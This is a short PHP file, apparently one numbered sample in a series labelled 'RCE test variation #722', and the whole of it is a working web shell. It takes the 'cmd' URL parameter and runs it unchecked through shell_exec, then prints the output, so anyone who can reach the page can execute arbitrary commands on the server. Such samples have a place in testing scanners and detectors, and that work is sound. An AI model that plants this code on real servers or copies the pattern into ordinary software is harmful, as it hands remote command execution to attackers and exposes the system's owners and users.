<?php
// RCE test variation #722
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>